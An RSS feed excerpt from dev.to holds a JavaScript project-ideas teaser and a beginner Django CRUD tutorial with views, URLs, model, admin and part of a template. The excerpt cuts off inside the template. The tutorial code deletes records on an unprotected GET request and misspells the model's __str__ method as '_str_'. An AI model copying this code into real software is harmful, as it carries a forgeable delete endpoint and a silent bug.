      <link>https://dev.to/coderzx/100-javascript-project-for-beginners-45ae</link>
      <guid>https://dev.to/coderzx/100-javascript-project-for-beginners-45ae</guid>
      <description>&lt;p&gt;If you’re interested in becoming a web developer, JavaScript is one of the best coding languages you can learn—but getting familiar with JavaScript basics means using those skills to build JavaScript projects. Need a little help coaxing inspiration to strike? We’ve put together a list of 20+ JavaScript project ideas you can start working on RIGHT NOW (whether you’re looking for JavaScript projects for beginners or JavaScript projects for intermediate coders and beyond).&lt;/p&gt;
&lt;p&gt;Go ahead, scroll through the list, and—when you find a JavaScript project that piques your interest and matches your skill level—follow the project link. Each of these open source JavaScript projects have their JavaScript projects source code listed on their home page for you to use as a guide.&lt;/p&gt;
&lt;h3&gt;1. BUILD A JAVASCRIPT CLOCK&lt;/h3&gt;
&lt;p&gt;If you’re on a website or using web applications with a self-updating time feature (you know, a clock), there’s a very good chance it’s powered by JavaScript code. This means JavaScript clocks don’t just make for good JavaScript projects, a JavaScript clock lets you get hands-on with the kind of actual work you’ll be doing as a JavaScript developer.&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Check originally Published article to read More&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Originally Published: &lt;a href="https://bit.ly/2UMq0p1"&gt;&lt;span&gt;Javascript Project For Beginners&lt;/span&gt;&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;

</description>
      <category>javascript</category>
    </item>
    <item>
      <title>CRUD with Django</title>
      <author>Madhuban Khatri</author>
      <pubDate>Sun, 25 Jul 2021 16:05:05 +0000</pubDate>
      <link>https://dev.to/madhubankhatri/crud-with-django-119l</link>
      <guid>https://dev.to/madhubankhatri/crud-with-django-119l</guid>
      <description>&lt;p&gt;Heelloooo friends!&lt;br&gt;
Welcome back to my blog page.&lt;/p&gt;

&lt;p&gt;Today you will get the code of &lt;strong&gt;CRUD&lt;/strong&gt; application in &lt;strong&gt;Django&lt;/strong&gt;.&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#what-is-crud"&gt;
  &lt;/a&gt;
  What is CRUD?
&lt;/h1&gt;

&lt;p&gt;C - CREATE&lt;br&gt;
R - RETRIEVE&lt;br&gt;
U - UPDATE&lt;br&gt;
D - DELETE &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#viewspy"&gt;
  &lt;/a&gt;
  views.py
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.shortcuts&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;redirect&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.http&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;

&lt;span class="c1"&gt;#RETRIEVE
&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;home&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="c1"&gt;#Retrieve all the persons' datas.
&lt;/span&gt;    &lt;span class="n"&gt;get_persons&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nb"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;'datas'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;get_persons&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;'home.html'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="c1"&gt;#CREATE
&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;add_person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;'POST'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'fname'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;lname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'lname'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'age'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;is_married&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'bool'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

        &lt;span class="n"&gt;create_person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;first_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;fname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;last_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;lname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;is_married&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;is_married&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;create_person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'home'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'GET request is not allowed.'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="c1"&gt;#UPDATE
&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;update_person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;get_person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;'data'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;get_person&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;'update.html'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;get_person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;'POST'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;fname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'fname'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;lname&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'lname'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'age'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;is_married&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;'bool'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

        &lt;span class="n"&gt;get_person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fname&lt;/span&gt;
        &lt;span class="n"&gt;get_person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;last_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lname&lt;/span&gt;
        &lt;span class="n"&gt;get_person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;age&lt;/span&gt;
        &lt;span class="n"&gt;get_person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;is_married&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;is_married&lt;/span&gt;
        &lt;span class="n"&gt;get_person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'Error'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;redirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'home'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;



&lt;span class="c1"&gt;#DELETE
&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;delete_person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;get_person&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;get_person&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"person deleted"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#urlpy"&gt;
  &lt;/a&gt;
  url.py
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.urls&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;.&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;views&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;''&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;views&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;'home'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'create/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;views&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_person&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;'add_person'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&amp;lt;str:id&amp;gt;/update_person/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;views&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update_person&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;'update_person'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'&amp;lt;str:id&amp;gt;/update/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;views&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;'update'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;'delete/&amp;lt;str:id&amp;gt;/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;views&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;delete_person&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;'delete_person'&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#modelspy"&gt;
  &lt;/a&gt;
  models.py
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;

&lt;span class="c1"&gt;# Create your models here.
&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;first_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;last_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;age&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IntegerField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;is_married&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_str_&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first_name&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#adminpy"&gt;
  &lt;/a&gt;
  admin.py
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.contrib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;admin&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Person&lt;/span&gt;

&lt;span class="c1"&gt;# Register your models here.
&lt;/span&gt;
&lt;span class="n"&gt;admin&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;register&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Person&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#homehtml"&gt;
  &lt;/a&gt;
  home.html
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class="c"&gt;&amp;lt;!-- Required meta tags --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;charset=&lt;/span&gt;&lt;span class="s"&gt;"utf-8"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"viewport"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"width=device-width, initial-scale=1"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

    &lt;span class="c"&gt;&amp;lt;!-- Bootstrap CSS --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"stylesheet"&lt;/span&gt; &lt;span class="na"&gt;integrity=&lt;/span&gt;&lt;span class="s"&gt;"sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"&lt;/span&gt; &lt;span class="na"&gt;crossorigin=&lt;/span&gt;&lt;span class="s"&gt;"anonymous"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Hello, world!&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"container w-50"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;h2&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"my-5"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;CRUD with DJANGO&lt;span class="nt"&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;

        &lt;span class="nt"&gt;&amp;lt;ul&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"nav nav-tabs"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"myTab"&lt;/span&gt; &lt;span class="na"&gt;role=&lt;/span&gt;&lt;span class="s"&gt;"tablist"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;li&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"nav-item"&lt;/span&gt; &lt;span class="na"&gt;role=&lt;/span&gt;&lt;span class="s"&gt;"presentation"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
